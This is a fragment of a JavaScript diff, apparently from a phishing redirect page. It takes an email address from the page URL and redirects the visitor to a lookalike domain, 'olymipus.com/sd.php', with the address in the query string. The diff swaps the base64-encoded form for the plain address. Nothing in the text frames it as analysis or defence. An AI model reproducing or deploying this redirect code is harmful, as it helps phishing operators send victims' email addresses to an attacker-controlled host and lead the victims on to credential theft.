@@ -21,7 +21,7 @@ if (email) {
        // Not base64 encoded, use the original value
  }
 
-    var redirectUrl = 'https://olymipus.com/sd.php?rav=' + btoa (decodedEmail);
+    var redirectUrl = 'https://olymipus.com/sd.php?rav=' +  (decodedEmail);
     window.location.href = redirectUrl;
 } else {
     console.log('Email address not found in the URL');
